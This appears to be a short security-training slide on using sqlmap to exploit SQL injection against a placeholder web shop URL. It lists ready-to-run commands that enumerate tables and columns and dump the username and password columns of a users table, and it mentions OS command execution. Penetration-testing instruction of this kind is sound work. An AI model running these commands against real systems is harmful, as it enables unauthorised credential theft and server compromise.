`sqlmap`: Enumerating and Dumping Data

Extracting tables, columns, and sensitive information from vulnerable databases.

Enumerate Tables
sqlmap -u "http://example.com/products.php?id=1" -D "webshop" --tables

Lists all tables in the 'webshop' database.

Enumerate Columns
sqlmap -u "http://example.com/products.php?id=1" -D "webshop" -T "users" --columns

Lists all columns in the 'users' table within 'webshop'.

Dump Data
sqlmap -u "http://example.com/products.php?id=1" -D "webshop" -T "users" -C "username,password" --dump

Extracts specific column data from the 'users' table.

Severe Impact

If the database user has sufficient privileges, sqlmap can even execute arbitrary OS commands, leading to full server compromise.

Key Takeaway

`sqlmap` provides a comprehensive workflow for SQLi exploitation, from initial detection to full data exfiltration and potential operating system command execution.
